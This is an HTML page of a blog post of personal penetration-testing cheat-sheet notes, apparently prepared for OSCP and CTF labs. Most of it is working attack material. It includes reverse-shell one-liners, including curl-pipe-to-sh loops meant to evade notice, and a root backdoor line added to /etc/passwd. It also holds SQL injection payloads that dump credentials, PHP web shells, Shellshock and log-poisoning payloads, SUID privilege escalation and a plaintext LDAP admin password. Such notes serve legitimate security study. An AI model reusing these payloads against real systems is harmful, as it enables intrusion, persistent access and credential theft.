<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Linux Cybersec Notes" /><meta name="author" content="Wrathdemon" /><meta property="og:locale" content="en" /><meta name="description" content="For binary specific tasks ``` sudo -l" /><meta property="og:description" content="For binary specific tasks ``` sudo -l" /><link rel="canonical" href="https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/" /><meta property="og:url" content="https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/" /><meta property="og:site_name" content="Wrathdemon" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-07T13:10:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Linux Cybersec Notes" /><meta name="twitter:site" content="@joshi_prabhat_" /><meta name="twitter:creator" content="@Wrathdemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Wrathdemon"},"dateModified":"2022-08-29T01:37:41+05:30","datePublished":"2022-01-07T13:10:00+05:30","description":"For binary specific tasks ``` sudo -l","headline":"Linux Cybersec Notes","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/"},"url":"https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/"}</script><title>Linux Cybersec Notes | Wrathdemon</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Wrathdemon"><meta name="application-name" content="Wrathdemon"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://raw.githubusercontent.com/prabhatjoshi321/cyberblog.ml/master/assets/img/favicons/image.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Wrathdemon</a></div><div class="site-subtitle font-italic">Walking alone without a shadow.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/prabhatjoshi321" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/joshi_prabhat_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['wrathdemon','wearehackerone.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://prabhatjoshi.ml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Linux Cybersec Notes</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Linux Cybersec Notes</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/prabhatjoshi321">Wrathdemon</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-01-07 13:10:00 +0530" data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 7, 2022, 1:10 PM +0530" >Jan 7</em> </span> <span> Updated <em class="timeago" date="2022-08-29 01:37:41 +0530 " data-toggle="tooltip" data-placement="bottom" title="Mon, Aug 29, 2022, 1:37 AM +0530" >Aug 29</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1214 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h3 id="for-binary-specific-tasks">For binary specific tasks<a href="#for-binary-specific-tasks"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>sudo -l

see for the sudo entries that sre allowed to execute binaries as sudo and check for entries on

	https://gtfobins.github.io/

search for that particular binary and use the suggested method there.

</pre></table></code></div></div><h4 id="persistence-can-be-obtained-by-making-entries-in-etcpasswd-file-do-the-following">Persistence can be obtained by making entries in /etc/passwd file, do the following<a href="#persistence-can-be-obtained-by-making-entries-in-etcpasswd-file-do-the-following"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
echo "realize:drkhtmpyc4URU:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd

This will give persistence via ssh as user realize while password being 1234
</pre></table></code></div></div><h3 id="reverse-shell-techniques">reverse shell techniques<a href="#reverse-shell-techniques"><i class="fas fa-hashtag"></i></a></h3></h3><h5 id="automated-method">Automated Method<a href="#automated-method"><i class="fas fa-hashtag"></i></a></h5></h5><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>on local machine
fire up netcat with tags -lvnp and port [any]

	nc -lvnp [port]

on attack machine execute

	https://reverse-shell.sh/[local-ip]:[local-port]

for recursive call, do this

	while true; do curl https://reverse-shell.sh/[local-ip]:[local-port] | sh; done

for no traces on network scanners or any trace od some shell open, do this

	sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &amp;" &amp;&amp; exit

this will exit the shell while running the script recursively in background

this will give a reverse shell, it works as someone has hosted a website with raw ascii bash script containing 4 reverse shell methods.
- python2
- netcat
- perl
- sh

</pre></table></code></div></div><h5 id="manual-methods">Manual methods<a href="#manual-methods"><i class="fas fa-hashtag"></i></a></h5></h5><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>until I learn the scripts, following manual method works,

go to
	https://www.revshells.com/
make the appropriate entries and tryout appropriate snippets
</pre></table></code></div></div><h4 id="stabilize-the-reverse-shell-by-the-following-methods">Stabilize the reverse shell by the following methods<a href="#stabilize-the-reverse-shell-by-the-following-methods"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>python -c 'import pty;pty.spawn("/bin/bash")'
export SHELL=/bin/bash
export TERM=xterm-256color

</pre></table></code></div></div><h4 id="restricted-shell-bypass">restricted shell bypass<a href="#restricted-shell-bypass"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>in a restricted shell condition, there apre few binaries that are used there, to bypass the fuckery of restricted shells, do the following

for [echo]
	echo os.system('/bin/bash')

for [exec]
	exec "/bin/sh";

for [perl]
	perl -e 'exec "/bin/sh";'

direct from ssh with aachine having netcat
	ssh [attack-user]@[attack-ip] nc [local-ip] [local-port] -e /bin/sh



</pre></table></code></div></div><h4 id="sql-injection">SQL Injection<a href="#sql-injection"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>works with MySQL
start with
	1' or '1' = '1

if result returns form is vulnerable
try union method

	1' UNION ALL SELECT 1 -- -

see if output cones
if result is null, increase the number till something comes up, the count determines the number of columns

	1' UNION ALL SELECT 1,2,3,4,5,6 -- -

now the column is determined, we will go for other details

	1' UNION ALL SELECT @@version,2,3,4,5,6 -- -
		the above payload will throw up database version

	1' UNION ALL SELECT concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata -- -
		the above payload will fetch for database names in information schema database

	1' UNION ALL SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='Staff' -- -
		the above query throws up table names in that database

	1' UNION ALL SELECT concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.COLUMNS WHERE table_name='StaffDetails' -- -
		this throws up the column names by fetching it from information schema database

now we have all the essential information about the database and the table layout
time to dump tables

	1' UNION ALL SELECT group_concat(Username," : ",Password),2,3,4,5,6 FROM users.UserDetails -- -
		this dumps the table




</pre></table></code></div></div><h5 id="sometimes-ports-are-locked-and-we-need-to-perform-port-knocking-by-nc">sometimes ports are locked and we need to perform port knocking by nc<a href="#sometimes-ports-are-locked-and-we-need-to-perform-port-knocking-by-nc"><i class="fas fa-hashtag"></i></a></h5></h5><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>config file present at
	/etc/knockd.conf
consists of ports required to knock
</pre></table></code></div></div><h3 id="web-enumeration">Web enumeration<a href="#web-enumeration"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>we can use gobuster as usual but if we are lost or we need more aggressive enumeration, wfuzz is the way to go</ul><h3 id="php-shellcode-for-rce">Php shellcode for RCE<a href="#php-shellcode-for-rce"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>	after knowing the vulnerable file, if it is vulnerable, inject this and use it for payload

		&lt;?php echo shell_exec($_GET['cmd']); ?&gt;

	if situation for LFI try to get the credentials file
	ls ls

</pre></table></code></div></div><h2 id="reverse-shell-payloads">Reverse shell payloads<a href="#reverse-shell-payloads"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>bash (works in all cases)
		bash -i &gt;&amp; /dev/tcp/10.10.10.3/1234 0&gt;&amp;1


python
		python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.56.107",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

</pre></table></code></div></div><h3 id="local-shell-payload">Local shell payload<a href="#local-shell-payload"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>
			import os

			os.system('cp /bin/bash /tmp/bash')
			os.system('chmod +s /tmp/bash')

this will create a bash with suid bit set in /tmp folder
		do
			./bash -p
		to get root shell



</pre></table></code></div></div><h4 id="rce-through-smtp">RCE through smtp<a href="#rce-through-smtp"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>we connect to port 25 via telnet
	telnet [host] [port]

send one mail with the payload
	do as follows
		MAIL FRON: &lt;qewr&gt;
		RCPT TO: Helios
		data
		&lt;?php system($_GET['cmd']); ?&gt;
		.
	now close the terminal

now go to LFI link and give in 1 extra parameter "cmd" like this
	http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=id

open nc inject reverse shell payload in above link and wait for callback

</pre></table></code></div></div><h4 id="privledge-escalation-through-suid-binary-and-path-overriding-as-binary-name-was-used">Privledge escalation through suid binary and path overriding as binary name was used<a href="#privledge-escalation-through-suid-binary-and-path-overriding-as-binary-name-was-used"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>	echo -n "/bin/sh" &gt; binary
	chmod 755 binary
	export PATH=/tmp:$PATH
	/location/of/suid/binary

</pre></table></code></div></div><h3 id="suid-binary-find">Suid binary find<a href="#suid-binary-find"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>
  find /opt -perm -u=s -type f 2&gt;/dev/null

</pre></table></code></div></div><h4 id="check-for-listening-ports-on-the-machine">Check for listening ports on the machine<a href="#check-for-listening-ports-on-the-machine"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>	netstat -tulpn
	ss -tulpn

	for ssh port forwarding, 2 nethods are there

		- ssh -L [local-port]:[hosted-remote-ip]:[hosted-remote-port] [remote-user]@[remote-host]
	OR
		- if logged into SSH
			press ENTER   ~   C
		- SSH prompt opens
		- give in the command]
			-L [local-port]:[hosted-remote-ip]:[hosted-remote-port]
		- press enter, port is forwarded, use firefox or any unproxied browser

</pre></table></code></div></div><h3 id="shellshock-vulnerability">Shellshock vulnerability<a href="#shellshock-vulnerability"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>inject the following payload into the user agent part of the page and use netcat to get shell


		() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

		 () { :; }; echo; echo; /bin/bash -c '/bin/nc -e /bin/bash 192.168.56.107 4321'


</pre></table></code></div></div><h3 id="user-specific-files">User specific files<a href="#user-specific-files"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>	find / -user hades 2&gt;/dev/null

</pre></table></code></div></div><h3 id="to-sniff-traffic-off-port">To sniff traffic off port<a href="#to-sniff-traffic-off-port"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>	tcpdump -v -i [interface] port [port-no]

</pre></table></code></div></div><h3 id="ldap-injection-through-ldap-poisoning">LDAP injection through LDAP poisoning<a href="#ldap-injection-through-ldap-poisoning"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>	Credentials for login can be * and *

</pre></table></code></div></div><h3 id="to-connect-to-ldap-via-credentials">to connect to LDAP via credentials<a href="#to-connect-to-ldap-via-credentials"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>	ldapsearch -x -h symfonos -D "CN=admin,DC=symfonos,DC=local" -w qMDdyZh3cT6eeAWD -b "DC=symfonos,DC=local"

</pre></table></code></div></div><h3 id="php-wrapper-to-see-php-pages-during-lfi">php wrapper to see php pages during LFI<a href="#php-wrapper-to-see-php-pages-during-lfi"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>
	/home.php?url=php://filter/convert.base64-encode/resource=home.php

</pre></table></code></div></div><h3 id="to-sudo-with-particular-user-rights">to sudo with particular user rights<a href="#to-sudo-with-particular-user-rights"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>	sudo -u [user] /bin/bash

</pre></table></code></div></div><h4 id="exploiting-python-apps-for-privledge-escalation">exploiting python apps for privledge escalation<a href="#exploiting-python-apps-for-privledge-escalation"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>give input as
	eval('__import__("os").system("id")')

</pre></table></code></div></div><h3 id="find-writable-directories-in-the-system">find writable directories in the system<a href="#find-writable-directories-in-the-system"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>	find / -perm -2 -type d 2&gt;/dev/null
</pre></table></code></div></div><h3 id="exploit-php-command-execution-vulnerability">exploit php command execution vulnerability<a href="#exploit-php-command-execution-vulnerability"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo'&lt;?php echo shell_exec($_GET['e']); ?&gt;' &gt;test.txt

</pre></table></code></div></div><h3 id="reverse-forward-a-port-through-reverse-shell">reverse forward a port through reverse shell<a href="#reverse-forward-a-port-through-reverse-shell"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>
on your machine
	chisel server --reverse --port 8000

on attacking machine
	./chisel client 10.14.13.211:8000 R:2049:127.0.0.1:2049

</pre></table></code></div></div><h3 id="search-for-a-particular-string">search for a particular string<a href="#search-for-a-particular-string"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>grep -iRl 'pat' /

</pre></table></code></div></div><h5 id="directory-enumeration-is-affected-by-ssl-use-appropriate-domain-before-enumeration">directory enumeration is affected by ssl, use appropriate domain before enumeration<a href="#directory-enumeration-is-affected-by-ssl-use-appropriate-domain-before-enumeration"><i class="fas fa-hashtag"></i></a></h5></h5><h4 id="rce-through-mysql-queries">RCE through mysql queries<a href="#rce-through-mysql-queries"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE "/var/www/html/wordpress/shell.php"

</pre></table></code></div></div><h3 id="lfi">LFI<a href="#lfi"><i class="fas fa-hashtag"></i></a></h3></h3><h5 id="use-php-wrappers-during-lfi-to-read-php-specific-files-that-are-otherwise-unreadable">use php wrappers during lfi to read php specific files that are otherwise unreadable<a href="#use-php-wrappers-during-lfi-to-read-php-specific-files-that-are-otherwise-unreadable"><i class="fas fa-hashtag"></i></a></h5></h5><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
	file=filter/read=string.rot13/resource=/etc/passwd


</pre></table></code></div></div><h4 id="log-poisoning">log poisoning<a href="#log-poisoning"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>we can inject malicious payload into popular applications log files and retrieve them through LFI to get RCE
This is log poisoning

change user agent to this

	curl -A "&lt;?php phpinfo();?&gt;" http://10-10-89-133.p.thmlabs.com/login.php
	curl -A "&lt;?php system($_GET['cmd']); ?&gt;" http://10-10-89-133.p.thmlabs.com/login.php
	page link file=/var/log.log&amp;cmd=ifconfig



</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/oscp/'>OSCP</a>, <a href='/categories/instructions/'>Instructions</a>, <a href='/categories/notes/'>Notes</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writing/" class="post-tag no-text-decoration" >writing</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Linux Cybersec Notes - Wrathdemon&url=https://www.cyberblog.ml/posts/Linux-Cybersec-Notes/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a 